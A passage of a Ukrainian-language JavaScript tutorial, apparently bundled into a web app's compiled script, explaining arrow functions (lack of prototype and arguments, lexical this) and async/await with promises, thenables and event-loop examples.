якщо використовувати замикання:\n\n~~~js\nconst getAnswer = ((questions, answers) => question => questions.includes(question)\n  ? answers[questions.indexOf(question)]\n  : 'I don\\'t undestand your question')(['who', 'what', 'where'], ['Irina', 'develop', 'Kharkiv'])\n~~~\n\nАбо так, якщо використати прийом карірування:\n\n~~~js\nconst getAnswerTemplate = (questions, answers, wrong, question) => questions.includes(question)\n  ? answers[questions.indexOf(question)]\n  : wrong\n\nconst getAnswer = getAnswerTemplate\n  .bind(null, ['who', 'what', 'where'], ['Irina', 'develop', 'Kharkiv'], 'I don\\'t undestand your question')\n~~~\n\n________________________________________\n\n## ![ico-25 icon] Головні особливості стрілкових функцій\n\n### ![ico-20 icon] prototype\n\n@@@@\n<br><br>У стрілочних функцій немає об'єкта **~prototype~**.<br><br>![ico-20 warn] Тому стрілочні функції не можуть бути конструктором.\n![](images/arrow-funcs-neutered-kitties-ukr-color.png)\n@@@@\n\n~~~js\nconsole.dir(() => {})\n~~~\n\n~~~console\n▼ ƒ anonymous ()\n    length: 0\n    name: \"\"\n    arguments: (...)\n    caller: (...)\n  ► [[Prototype]]: ƒ ()\n~~~\n\n~~~js\nconsole.dir(function () {})\n~~~\n\n~~~console\n▼ ƒ console ()\n    arguments: null\n    caller: null\n    length: 0\n    name: \"\"\n  ► prototype: {}\n  ► [[Prototype]]: ƒ ()\n~~~\n\n![ico-20 warn] При спробі викликати стрілкову функцію з ключовим словом **~new~**\n\n~~~js\nconst arrowFunc = () => {}\nvar obj = new arrowFunc()\n~~~\n\nбуде згенеровано виключення:\n\n~~~error\n    TypeError: arrowFunc is not a constructor\n~~~\n\n______________________________________________________\n\n### ![ico-25 icon] arguments\n\nУ стрілкових функцій немає об'єкта  **~arguments~**.\n\nПри спробі звернутися до об'єкта **~arguments~** з стрілочної функції буде згенеровано виключення ~ReferenceError~.\n\n~~~js\n((x, y) => console.log(arguments))(5, 7)\n~~~\n\n~~~error\n    ReferenceError: arguments is not defined\n~~~\n\n![ico-20 pin] Якщо стрілочна функція оголошена всередині звичайної функції,\nто змінні контексту батьківської функції будуть доступні для стрілочної функції\n(**~ланцюг областей видимості~**),\nтому всередині неї буде доступний об'єкт **arguments** батьківської функції.\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nfunction testArguments () {\n  (() => console.log(arguments))()\n}\ntestArguments(5, false)\n~~~\n\nВ результаті роботи коду в консоль буде виведено об'єкт **arguments** функції **_testArguments_**:\n\n~~~console\n▼ Arguments(2) [5, false, callee: ƒ, Symbol(Symbol.iterator): ƒ]\n    0: 5\n    1: false\n  ► callee: ƒ testArguments()\n    length: 2\n  ► Symbol(Symbol.iterator): ƒ values()\n  ► [[Prototype]]: Object\n~~~\n\n______________________________________________________\n\n### ![ico-20 icon] Контекст виклику\n\nУ стрілкових функціях контекст виклику завжди буде контекстом, у якому функцію оголошено.\nЗмінити контекст виклику стрілкової функції неможливо.\nМожна сказати, що у стрілкових функцій є \"вроджений\" контекст виклику.\n\n#### ![ico-20 icon] Літерал об'єкта\n\n~~~js\nwindow.name = 'Chrome'\n\nconst human = {\n  name: 'Stephan',\n  getName () {\n    console.log(this.name)\n  },\n  showName: () => console.log(this.name)\n}\n\nhuman.getName()   // Stephan\nhuman.showName()  // Chrome\n~~~\n\nДавай розберем детальніше, що відбувається.\nПеред тим, як виконати присвоєння значення змінній **~human~**, двигун має обчислити значення виразу в правій частині оператора присвоєння.\nУ правій частині знаходиться літерал об'єкта.\n1. Двигун викликає конструктор **~Object~**.\n2. Конструктор **~Object~** створює порожній об'єкт і повертає посилання на нього.\n3. Двигун, отримавши посилання на об'єкт, поміщає це посилання в змінну **~human~** і виконує три присвоєння:\n\n~~~js\nhuman.name = 'Stephan'\nhuman.getName = function () {\n  console.log(this.name)\n}\nhuman.showName = () => console.log(this.name)\n~~~\n\nВарто зазначити, що всі три присвоєння відбуваються в глобальній області видимості, тобто в контексті глобального об'єкта **~window~**.\nІ ось тут ми бачимо, як працює передача контексту в процесі присвоєння:\n\n![ico-20 pin] якщо в правій частині оператора присвоєння знаходиться **звичайна функція**, то вона отримує посилання на контекст виклику, визначений в **лівій частині** оператора присвоєння (в нашому прикладі це об'єкт **~human~**);\n![ico-20 pin] якщо в правій частині оператора присвоєння знаходиться **стрілкова функція**, то вона отримує контекст \"**правої частини**\", тобто того об'єкта, в контексті якого відбувається присвоєння (в нашому прикладі це глобальний об'єкт **~window~**).\n\nДля приколу я називаю це \"правилом буравчика\" ![ico-25 smile].\n\n----------------\n#### ![ico-20 icon] Конструктор\n\nТепер згадаємо, як працює конструктор.\n\n~~~js\nfunction Sample (name) {\n  this.name = name\n  this.getName = function () {\n    console.log(this.name)\n  }\n  this.showName = () => console.log(this.name)\n}\n~~~\n\nКоли ми викликаємо функцію **~Sample~** з ключовим словом **~new~**:\n\n~~~js\nconst user = new Sample('Piter')\n~~~\n\nто движок виконує таку послідовність кроків:\n1. Викликає конструктор **~Object~**.\n2. Конструктор **~Object~** створює порожній об’єкт і повертає посилання на нього.\n3. Движок поміщає отримане посилання в змінну **~user~**.\n~~~js\nconst user = new Object()\n~~~\n4. Движок додає в об’єкт **~user~** посилання на властивість **~prototype~** функції **~Sample~**.\n~~~js\nObject.setPrototypeOf(user, Sample.prototype)\n~~~\n5. Движок викликає функцію **~Sample~** в контексті об’єкта **~user~**.\n~~~js\nSample.call(user, 'Piter')\n~~~\n\nТобто, до моменту, коли код функції **~Sample~** буде виконуватися, контекст її виклику буде створено (**~user~**), і це буде екземпляр.\nЧий екземпляр?\nДвижок вже додав цьому екземпляру посилання на prototype функції **~Sample~**.\nА в об’єкті **~prototype~** функції є властивість **~constructor~**, що містить посилання на цю функцію.\nТобто, екземпляр вже має посилання на конструктор **~Sample~**:\n\n~~~js\nconsole.log(user.__proto__.constructor.name)  // Sample\n~~~\n\nі тепер він розпізнається як екземпляр конструктора **~Sample~**:\n\n~~~js\nconsole.log(user instanceof Sample)  // true\n~~~\n\nЩо головне, що ми з цього витягуємо:\nФункція **~Sample~** буде працювати в контексті створюваного екземпляра, тобто в контексті об'єкта **~user~**.\nТоді присвоєння:\n\n~~~js\nthis.showName = () => console.log(this.name)\n~~~\n\nвідбуватиметься в контексті екземпляра **~user~**.\nЦе означає, що стрілкова функція праворуч від оператора присвоєння отримає контекст об'єкта **~user~**.\n\n__________________________________\n\n#### ![ico-20 icon] Фабрика\n\nТепер подивимось, що відбувається, коли замість конструктора ми використовуємо фабрику:\n\n~~~js\nconst template = {\n  name: 'Robert'\n}\n\nfunction fabric (instance, name) {\n  instance.name = name\n  instance.getName = function () {\n    console.log(this.name)\n  }\n  instance.showName = () => console.log(this.name)\n  return instance\n}\n\nconst user = fabric.call(template, {}, 'Piter')\n~~~\n\nФункція **~fabric~** викликається в контексті об'єкта **~template~**.\nЗгідно з нашим \"правилом буровчика\" ![ico-20 smile], метод **~showName~** отримає \"вроджений\" контекст виклику - посилання на об'єкт **~template~**.\n\nПеревіримо:\n\n~~~js\nuser.showName()  // Robert\n~~~\n____________________________________________________\n\n**Висновок**\n\nЯкщо екземпляр об'єкта створений з допомогою конструктора,\nвикористання стрілкових функцій у публічних методах об'єкта гарантує,\nщо **~this~** завжди вказуватиме на екземпляр.\n\nВ іншому випадку використання стрілкової функції створить купу проблем з контекстом виклику методу.\n\n_____________________________________________________\n\n## ![ico-20 icon] Приклади\n\n◘◘![ico-25 cap] ** 1**◘◘\n~~~js\nfunction Sample (name, age) {\n  const userName = name\n  const userAge = age\n  this.getName = this.createMethod(userName)\n  this.getAge = this.createMethod(userAge)\n}\n\nSample.prototype.createMethod = param => () => console.log(param)\n\nconst user = new Sample('Piter', 28)\n~~~\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst test = ((data = []) => arg => {\n  arg && data.push(arg)\n  return arg ? test :  data\n})()\n\ntest(1)\ntest(2)\ntest(3)\n\nconsole.log(test()) // [1, 2, 3]\n\ntest(4)(5)(7)(8)\n\nconsole.log(test()) // [1, 2, 3, 4, 5, 7, 8]\n~~~\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nconst getUser = (getName = prompt.bind(null, 'User name'), getAge = prompt.bind(null, 'User age')) => ({\n  name: getName(),\n  age: getAge()\n})\n~~~\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\n(func => Object.assign({\n  name: func('Your name'),\n  hobby: func('Your hobby')\n}))(message => prompt(message))\n~~~\n\n____________________________________________________________________\n\n[![ico-30 hw] Quiz](quiz/arrowFunctions)\n"},4540:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] async | await\n\n**ECMAScript 2017**\n\n________________________________________________________________________________________________\n\n[►►►**Конструктор AsyncFunction**►►►](page/async-constructor)\n\n________________________________________________________________________________________________\n\nДва коротких слова, які фантастично змінили нашу реальність.\nДва слова, які запускають потужний механізм контролю стихії подій.\nСлова, які повністю звільнили нас від рабства подій, дозволили «осідлати» дикого коня асинхронності.\nСловом, магія триває... 'Обіцянки' були лише початком.\n\n## ![ico-25 icon] async function\n\nЩоб оголосити асинхронну функцію, використовуйте ключове слово **~async~** перед ключовим словом **~function~**:\n\n~~~js\nasync function sigma () {\n  ...\n}\n~~~\n\nДля стрілкових функцій:\n\n~~~js\nconst sayHello = async () => 'Hello'\n~~~\n\nЩо це змінює в нашому житті?\n\n![ico-25 warn] **Виклик асинхронної функції повертає екземпляр ~Promise~.**.\n\nТаким чином, асинхронна функція є більш лаконічним способом створення екземплярів ~Promise~, ніж конструктор **~Promise~**.\n\nТепер, замість створення проміса традиційним способом (за допомогою конструктора):\n\n~~~js\nconst createPromise = message => new Promise(resolve => resolve(message))\n~~~\n\nми можемо зробити наш код набагато коротшим і читабельнішим:\n\n~~~js\nconst createPromise = async message => message\n~~~\n\nФункція **~createPromise~** і в першому, і в другому варіанті створює _екземпляр ~Promise~_, однак у другому варіанті ми обходимося без явного виклику конструктора **~Promise~**.\n\nЧим резолвиться екземпляр ~Promise~, що повертає асинхронна функція?\n\n~~~js\ncreatePromise('Promise is microtask')\n  .then(response => console.log(response))\n~~~\n\n![ico-20 warn] Тим, що повертає асинхронна функція за допомогою оператора **~return~**.\n^^Якщо в асинхронній функції немає оператора **~return~**, то проміс, який вона повертає, буде резолвитися значенням ~undefined~.^^\n\n______________________________________________\n\nУ наступних прикладах ми будемо будувати графіки функцій асинхронно по точках.\nОскільки ми будемо відображати графіки функцій на сторінці, нам потрібно вирішити, в якому контейнері будуть знаходитися ці графіки.\n\n~~~js\nconst section = document.body\nsection.style = 'padding: 120px;'\n~~~\n\nТакож створюємо допоміжну функцію **~createPoint~**:\n\n~~~js\nfunction createPoint (x, y, color = '#f50') {\n  const point = section\n    .appendChild(document.createElement('span'))\n  point.innerText = '•'\n  point.style = `\n    position: relative;\n    left: ${x.toFixed(2)}px;\n    top: ${y.toFixed(2)}px;\n    color: ${color};\n  `\n}\n~~~\n\nі ще дві - **~sin~** і **~cos~**:\n\n~~~js\nconst step = Math.PI / 10\n\nconst sin = num => createPoint(num * step * 30, Math.sin(num * step) * 100, '#09b')\nconst cos = num => createPoint(num * step * 30, Math.cos(num * step) * 100)\n~~~\n\nЗверніть увагу, що досі ми не використовували асинхронну функцію.\n\nА от тепер вона з'явиться:\n\n◘◘![ico-25 cap] ** 1**◘◘\n~~~js\nconst recurse = (times => {\n  let counter = 0\n  let promise = (async () => sin(0))().then(cos(0))\n  return function () {\n    promise = promise\n      .then(sin.bind(null, counter))\n      .then(cos.bind(null, counter))\n    counter++ < times && recurse()\n  }\n})(20)\n\nrecurse()\n~~~\n\n{{{async-await-01.js}}}\n\nТут ми бачимо анонімну асинхронну функцію **~async () => sin()~**.\nМи вже знаємо, що вона повертає **~promise~**.\n\n^^^[![ico-30 eyes]]\n\n^^Звісно, для демонстрації ланцюгових обчислень ми могли записати й так:^^\n\n~~~js\nconst start = () => (async () => sin())().then(cos)\n\nstart()\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n~~~\n\n^^однак використання рекурсивної функції робить код набагато коротшим, хоча й не таким наочним.^^\n\n^^^\n\nУ цьому прикладі ми скористалися тим,\nщо не лише асинхронна функція, а й метод **~then~** повертає **~promise~**.\n\nЗавдяки цьому кожна точка кожного графіка будується колбеком промісу (мікротаском), тобто. сторінка не втрачає інтерактивність під час побудови графіків.\n\n_________________________________________\n\nА тепер покажемо наочніше, як мікротаски пропускають один одного по черзі в стек викликів, від чого складається враження, що графіки функцій малюються одночасно, хоча насправді спочатку малюється одна точка графіка функції синус, за нею - одна точка графіка косинуса, потім знову одна точка синуса, і т.д.\n\nДля того, щоб зробити процес наочнішим, скористаємося методом глобального об'єкта **~requestAnimationFrame~**.\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst recurseSin = (times => {\n  let counter = 0\n  let promise = (async () => sin(0))()\n  return function () {\n    promise = promise.then(sin.bind(null, counter))\n    counter++ < times && requestAnimationFrame(recurseSin)\n  }\n})(20)\n\nconst recurseCos = (times => {\n  let counter = 0\n  let promise = (async () => cos(0))()\n  return function () {\n    promise = promise.then(cos.bind(null, counter))\n    counter++ < times && requestAnimationFrame(recurseCos)\n  }\n})(20)\n\nrecurseSin()\nrecurseCos()\n~~~\n\n{{{async-await-02.js}}}\n\n________________________\n\nДля більшої переконливості додамо ще анімовану фігуру:\n\n~~~js\nconst start = Date.now()\n\nfunction createFigure () {\n  const figure = section\n    .appendChild(document.createElement('div'))\n  return Object.assign(figure, {\n    style: `\n      position: absolute;\n      top: 108px;\n      left: 48px;\n      width: 100px;\n      height: 100px;\n      border-radius: 4px;\n      background: #fa0;\n    `,\n    move () {\n      const { left } = figure.style\n      Object.assign(figure.style, {\n        left: parseInt(left) + 2 + 'px'\n      })\n      Date.now() - start < 5000 && requestAnimationFrame(figure.move)\n    }\n  })\n}\n~~~\n\nі переконаємося, що у нашому прикладі малювання графіків функцій не блокує анімацію фігури:\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nrecurseSin()\nrecurseCos()\nconst figure = createFigure()\nfigure.move()\n~~~\n\n{{{async-await-03.js}}}\n\nВаші алодисменти, панове! Асинхронна функція їх точно заслужила.\nІ це лише початок.\n\n________________________________________________________________________________________________\n\n## ![ico-25 icon] await\n\n![ico-20 warn] Ключове слово **~await~** можна використовувати лише всередині **асинхронних функцій**.\n\n^^В іншому випадку буде згенеровано виняток:^^\n\n~~~error\n    Uncaught SyntaxError: await is only valid in async function\n~~~\n\nДавайте розберемося, що робить двигун, коли зустрічає ключове слово **~await~**.\nПо-перше, за ключовим словом **~await~** завжди слідує якийсь вираз.\nМи знаємо, що коли двигун натрапляє на вираз у нашому коді, він обчислює його значення і замінює цей вираз на обчислене значення.\nОтже, розберемося, що може слідувати за ключовим словом **~await~**, і як поводитиметься двигун у кожному випадку.\n\nМи розглянемо варіанти, коли за ключовим словом **~await~** слідує:\n1. проміс (наша \"магічна коробка з двома дірками\");\n2. об'єкт, що має метод **~then~**;\n3. будь-який вираз, значенням якого буде посилання на масив чи об'єкт, рядок, чи число, чи логічне значення, а також ~null~ і ~undefined~.\n\nЧому ми окремо розглядаємо ці варіанти?\nТому що поведінка движка буде різною в кожному з цих випадків.\n\n_____________________________________\n\n### ![ico-20 icon] await &lt;promise>\n\nНасамперед подивимося, що станеться, якщо після ключового слова **~await~** знаходиться посилання на нашу \"магічну коробку з двома дірками\".\n\nСтворимо дві допоміжні функції:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nconst random = num => Math.round(Math.random() * num)\n\nconst func = (message, resolve) => setTimeout(() => resolve(message), random(5000))\n\nconst createPromise = message => new Promise(func.bind(null, message))\n~~~\n\nОтже, ми можемо створити \"магічну коробку з двома дірками\" методом **~createPromise~**.\nПотім ми можемо використовувати метод **~then()~** цієї \"коробки\" (промісу) для передачі колбека (функції зворотного виклику), який \"забере\" результат, яким резолвується проміс.\n\n~~~js\ncreatePromise('Resolved!').then(console.log)\n~~~\n~~~console\nResolved!\n~~~\n\nА тепер подивимося, як можна використовувати ключове слово **~await~**, і чим відрізняється його робота від роботи методу **~then()~** промісу.\n\n~~~js\nconst asyncFunc = async () => console.log(await createPromise('Resolved!'))\n\nasyncFunc()\n~~~\n\n~~~console\nResolved!\n~~~\n\nАбо так:\n\n~~~js\n(async () => console.log(await createPromise('Resolved!')))()\n~~~\n\n~~~console\nResolved!\n~~~\n\nПоки що жодних відмінностей не спостерігається.\nТобто ключове слово **~await~** призводить до виклику методу **~then()~** екземпляра ~Promise~, який стоїть після **~await~**.\nАле виникає питання: метод **~then()~** екземпляра ~Promise~ повинен отримати як аргументи посилання на колбек-функції.\nПроте вираз:\n\n~~~js\nawait createPromise('Resolved!')\n~~~\nжодної колбек-функції не містить. Навіть натяку.\nДавайте розберемося, що там відбувається.\n\n~~~js\nnew Promise((resolve, reject) => {\n  console.log('resolve:\\n', resolve)\n  console.log('reject:\\n', reject)\n})\n~~~\n\n~~~console\nresolve:\n ƒ () { [native code] }\nreject:\n ƒ () { [native code] }\n~~~\n\nПри виклику конструктора **~Promise~** йому було передано функцію з двома формальними параметрами.\nВона була викликана, і отримала при виклику як аргументи два колбеки.\nЯк бачимо, це деякі дефолтні колбеки.\nВони \"забирають\" результат і поміщають його в нашу \"магічну коробку з двома дірками\".\n\nТому логічно припустити, що ці колбеки мають такий код:\n\n~~~js\nresult => result\n~~~\n\nПодивимося, що робить **~await~**:\n\n◘◘resolve◘◘\n~~~js\nconst test = async () => console.log('Result: ', await Promise.resolve('Success.'))\ntest()\n~~~\n\n~~~console\nResult:  Success.\n~~~\n\n◘◘reject◘◘\n~~~js\nconst test = async () => console.log('Result: ', await Promise.reject('Failure.'))\ntest()\n~~~\n\n~~~error\n    Uncaught (in promise) Failure.\n~~~\n\nПорівняємо цю поведінку з явним викликом методу **~then~** промісу з передачею йому двох колбеків:\n\n~~~js\nPromise.reject('Failure.')\n  .then(console.log, console.warn)\n~~~\n\n~~~warn\n    Failure.\n~~~\n\nЯк бачите, **~await~** викликає метод **~then~**, але передає йому лише один колбек (**~resolve~**).\nУ разі реджекту управління буде \"перехоплено\" двигуном, який викине в консоль виняток.\n\nТому для \"перехоплення\" винятків варто використати метод **~catch~**:\n\n~~~js\nconst test = async () => {\n  const result = await Promise.reject('Failure.')\n    .catch(console.warn)\n  result && console.log('Result: ', result)\n}\ntest()\n~~~\n\n~~~warn\n    Failure.\n~~~\n_____________________________________________\n\nНехай у нас є така функція:\n\n~~~js\nconst func = (resolve, reject) => Math.random() > 0.5 ? resolve('Success.') : reject('Failure.')\n~~~\n\nЯкщо ми скористаємося методом **~then~** промісу для передачі другого колбека **~reject~**:\n\n◘◘**^^Promise^^**◘◘\n\n~~~js\nnew Promise(func)\n  .then(console.log, console.warn)\n~~~\n\nто виняток буде \"перехоплено\", і в консолі буде попередження.\n\nЯкщо ж ми скористаємося ключовим словом **~await~**:\n\n◘◘**^^async function^^**◘◘\n\n~~~js\nasync function test () {\n  console.log(await new Promise(func))\n}\n~~~\n\nтоді у разі \"відмови\" промісу буде згенеровано виняток:\n\n~~~error\n    Uncaught (in promise) Failure.\n~~~\n\nТаким чином, якщо за ключовим словом **~await~** слідує _проміс_, то двигун викличе метод **~then~** цього _промісу_, але ![ico-20 warn] без передачі другого колбека  (**~reject~**).\n\n~~~js\nnew Promise(func).then(console.log)\n~~~\n\n________________________________________\n\nА якщо після ключового слова **~await~** буде не _проміс_, а будь-який інший об'єкт?\nЧи навіть не об'єкт, а якийсь рядок, чи число, чи логічне значення?\n\n_____________________________________\n\n### ![ico-20 icon] Об'єкт з методом then\n\nДавайте створимо об'єкт, який має метод **~then()~**:\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nconst user = {\n  name: 'Polina',\n  then (callback) {\n    callback(this.name)\n  }\n}\n\nuser.then(console.log)\nconsole.log('finish')\n~~~\n~~~console\nPolina\nfinish\n~~~\n\nОчевидно, що об'єкт **~user~**  **не**  є _промісом_, і жодної асинхронщини поки що не спостерігається.\n\nОднак подивимося, що станеться під час виконання коду:\n\n~~~js\nconst test = async () => console.log(await user)\ntest()\nconsole.log('finish')\n~~~\n~~~console\nfinish\nPolina\n~~~\n\nЯк бачимо, двигун, виявивши ключове слово **~await~**, не сильно напружувався з тим, що за вираз слідує за ним, і його анітрохи не збентежило те, що це не _проміс_.\nДвигун виявив, що це об'єкт, який має метод **~then()~**.\n\nІ що ми бачимо? Метод **~then()~** об'єкта **~user~** був викликаний!\n\nАле тут є одна загадка:\n\nМетод **~then()~** об'єкта **~user~** є **функцією вищого порядку**,\nтобто він очікує під час виклику отримати один обов'язковий аргумент - **функцію**.\nАле ми не передавали жодного аргументу методу **~then()~** об'єкта **~user~**.\nБільше того, ми його взагалі не викликали!\n\nВиходить, що двигун не тільки сам викликав метод **~then()~** об'єкта **~user~**,\nале ще й передав йому якусь функцію як аргумент.\n\nПитання: який колбек передав двигун методу **~then()~** об'єкта **~user~**?\n\nСудячи з поведінки методу **~then()~**, він отримав такий колбек:\n\n~~~js\nresponse => response\n~~~\n\nтобто колбек, який діє за принципом: \"Що отримав - те й віддаю\".\n\nЯк бачите, зустрівши одне мале слово **~await~**, двигун розвиває досить бурхливу діяльність.\n\nОстанній \"штрих\": у попередньому прикладі метод **~then~** об'єкта **~user~** був функцією вищого порядку, тобто приймав як аргумент функцію.\nДавайте подивимося, що станеться, якщо метод **~then~** буде звичайною функцією:\n\n~~~js\nconst user = {\n  name: 'Polina',\n  then () {\n    console.log(this.name)\n  }\n}\n\n;(async () => {\n  await user\n  console.log('Hi from Event Loop')\n})()\n\nconsole.log('finish')\n~~~\n\n~~~console\nfinish\nPolina\n~~~\n\nЯк бачите, рядок\n\n~~~js\nconsole.log('Hi from Event Loop')\n~~~\n\nтак і не було виконано.\nЦе означає, що асинхронна функція так і не дочекалася повернення колбека (бо його не було), і не змогла відновити своє виконання після **~await~**.\nТобто асинхронна функція могла повернутися з циклу подій лише після повернення звідти колбека, відправленого туди методом **~then~**.\nАле метод **~then~** не надіслав нічого до циклу подій.\nБудьте уважні!\n\n_____________________________________\n\n### ![ico-20 icon] Згадаймо обіцянки\n\nМи з вами вже говорили, що екземпляр конструктора **~Promise~** - це магічна коробка з двома дірками.\nМетоди **~then()~** та **~catch()~** - це і є \"дірки\" в коробці.\nЧерез ці \"дірки\" ми всовуємо свої колбеки, і коробка \"обіцяє\" нам, що як тільки в ній з'явиться вміст, один з наших колбеків його отримає.\n\n@@@@ 2\nКоли у коробці з'явиться вміст – невідомо.<br>Яким буде цей вміст - \"білою кулею\" (**response**) або \"чорною кулею\" (**error**) - теж невідомо.\n![](illustrations/white-and-black.png)\n@@@@\n\n~~~~js\nconst getStatus = async () => Math.random() > .5 ? 'white' : 'black'\n\nconst func = ((startTime, callback) => {\n  const time = Math.round(Math.random() * 30000)\n  return async timeStamp => {\n    const interval = timeStamp - startTime\n    if (interval < time) requestAnimationFrame(func)\n    else callback(await getStatus())\n  }\n})(0, console.log)\n\nrequestAnimationFrame(func)\n~~~~\n\nТреба відзначити, що коробка промісу знає, що їй потрібно \"зловити\" білу або чорну кулю, коли вона прилетить.\n\nІ магічна коробка відправляє свої власні колбеки за білою та чорною кулею у **Event Loop**.\n\nКолбеки вже \"сидять\" у таблиці евентів \"у засідці\".\nВони \"ловлять кулі\" за нас.\nКоли спіймають, то покладуть у магічну коробку екземпляра **~Promise~**.\nВони прив'язані відповідно до таких подій:\n\n1. \"Прилетіла біла куля\" (response)\n2. \"Прилетіла чорна куля\" (error)\n\nНазад з **Event Loop** повернеться лише один із них.\nУ коробці екземпляра **~Promise~** з'явиться вміст.\n\n{{{async-await-05.js}}}\n\nТепер магічна коробка з двома дірками чекає, коли ви всунете в ці дірки свої \"руки\" (колбеки **~resolve~** і **~reject~**), яким можна буде віддати кулю, що прилетіла.\n\nМожливо, ви вже \"всунули руки\" раніше, тоді ви отримаєте кулю, як тільки вона з'явиться в коробці екземпляра **~Promise~**.\nВ іншому випадку куля лежатиме в коробці, поки ви не скористаєтеся методами **~then()~** і **~catch()~**, тобто поки ви не \"всунете руки\", щоб забрати кулю.\n\n![ico-30 point_up] Звідси випливає, що магічна коробка синхронізує два автономні асинхронні процеси.\nУ цьому полягає магічна сила коробки з двома дірками.\n\nТобто магічна коробка _промісу_ посилає \"збігати за кулькою\" свої власні колбеки, а потім чекає, коли ви всунете руки (колбеки) в дірки **~then()~** і **~catch()~**, щоб віддати кулька, що знаходиться на зберіганні.\n\n^^Причому в одну дірку **~then()~** ви можете всунути обидві руки (**~resolve~** і **~reject~**), хоча використання другої дірки **~catch()~** у деяких випадках позбавляє вас від повідомлень про помилку в консолі.^^\n\n☼☼☼Не змушуйте консоль червоніти за вас☼☼☼\n\n_________________________________________\n\n### ![ico-20 icon] await &lt;expression>\n\nОтже, двигун стикається з виразом ~**await** &lt;expression>~.\nЙому треба вирахувати значення цього виразу.\n![ico-25 warn] Поки він не обчислить і не замінить вираз ~await &lt;expression>~ на отримане (обчислене) значення, він не зрушить до наступного рядка коду асинхронної функції.\n\nЯкщо значенням ~<expression>~ буде посилання на екземпляр **~Promise~**, то двигун викличе метод **~then()~** цього екземпляра, передасть йому колбек:\n\n~~~js\nresponse => response\n~~~\n\nі призупинить виконання коду асинхронної функції до тих пір, поки колбек не повернеться з **Event Loop** з \"кулькою\" результату (~response~) і не покладе його в \"коробку\" промісу.\n\nПісля того, як результат з'явиться в коробці, двигун витягне його з коробки і вставить на місце вираження ~await &lt;expression>~.\n\nМи вже ставили собі питання, що буде робити движок, якщо ~&lt;expression>~ не буде промісом.\nІ ми вже розібралися, що робитиме двигун, якщо ~&lt;expression>~ буде об'єктом, у якого є метод **~then()~**.\n\nТепер подивимося, що робитиме двигун, якщо ~&lt;expression>~ буде рядком, чи числом, чи іншим значенням.\n\n◘◘![ico-25 cap] ** 6**◘◘\n~~~js\nconsole.log('Start')\n;(async function () {\n  console.log('Async function starts')\n  console.log(await 'Hello!')\n  console.log('Async function finished')\n})()\nconsole.log('Finish')\n~~~\n\nУ цьому прикладі слід уважно стежити за послідовністю виведення повідомлень у консоль:\n\n~~~console\nStart\nAsync function starts\nFinish\nHello!\nAsync function finished\nundefined\n~~~\n\nВсе, що виведено в консоль після повідомлення **_Finish_** - це функції зворотного виклику, які пройшли через **Event Loop**.\nЯкщо вони виведені до ~undefined~ - це **мікротаски**.\n\nОтже, двигун благополучно виводив у консоль ^^**_Start_**^^, потім натрапив на функціональний вираз ([IIFE](page/Closure#IIFE)) і почав \"обчислювати\" значення виразу в круглих дужках. А в круглих дужках – оголошення анонімної асинхронної функції. Двигун передає управління конструктору, який створює цю функцію та повертає посилання на неї. Двигун, отримавши посилання на функцію, викликає її, оскільки далі йдуть дужки (виклик функції).\nАнонімна асинхронна функція починає виконуватися, і в консоль виводиться повідомлення ^^**_Async function starts_**^^.\nОднак вже в наступному рядку коду функції двигун \"наткнувся\" на вираз:\n\n~~~js\nconsole.log(await 'Hello!')\n~~~\n\nТут двигун розуміє, що потрібно послати колбек ~() => 'Hello!'~ у **Event Loop**, і функція повинна дочекатися його повернення, щоб завершити виконання цього рядка коду. Далі код функції виконуватися не може, доки не повернеться колбек. А повернутися він може лише тоді, коли стек викликів буде вільним.\nОтже, движку потрібно на якийсь час \"позбутися\" цієї функції, але так, щоб після повернення колбека ~() => 'Hello!'~ можна було відновити її виконання.\n\nЯк це можна зробити?\n\nНаприклад, замінивши код функції, що залишився невиконаним:\n\n~~~js\nconsole.log(await 'Hello!')\nconsole.log('Async function finished')\n~~~\n\nна такий код:\n\n~~~js\nPromise.resolve('Hello!')\n  .then(message => {\n    console.log(message)\n    console.log('Async function finished')\n  })\n~~~\n\nІ далі двигун продовжує виконувати код скрипта з рядка:\n\n~~~js\nconsole.log('Finish')\n~~~\n\nпісля чого стек викликів звільняється, і з **Event Loop** повертається колбек:\n\n~~~js\nmessage => {\n  console.log(message)\n  console.log('Async function finished')\n}\n~~~\n\nкотрий отримав ~message~ зі значенням '_Hello_!'.\n\nТаким чином, поява ключового слова **~await~** призводить до того, що невиконаний залишок коду асинхронної функції стає колбеком.\n\n_____________________________________________\n\n## ![ico-20 icon] Приклади\n\n### ![ico-25 cap] 7\n\nУ цьому прикладі ми спеціально дали ім'я **~test~** функції, щоб відстежувати її появу у стеку викликів.\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\nconsole.log('Start')\n\n;(async function test (callback) {\n  const inputs = []\n  inputs.push(await 5)\n  inputs.push(await 7)\n  inputs.push(await 9)\n  const result = inputs\n    .reduce((res, num) => res += num)\n  callback(await result)\n})(console.log)\n\nconsole.log('Finish')\n~~~\n\n![](illustrations/async-await-7.gif)\n\n__________________________________________________________________________\n\n### ![ico-25 cap] 8\n\nУ цьому прикладі код основного потоку відпрацює за значенням ** 5** змінної ~num~.\nОднак, виклик асинхронної функції ~sample()~ призведе до того, що після завершення роботи коду основного потоку значення змінної ~num~ буде вже **10**.\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nlet num = 5\n\nasync function sample (arg) {\n  num = await arg\n}\n\nsample(10)\n  .then(() => console.log(`Finish value: ${num}`))\n\nconsole.log('Start value: ', num)\n~~~\n\n••Start value:  5••\n••Finish value: 10••\n\n_________________________________\n\n### ![ico-25 cap] 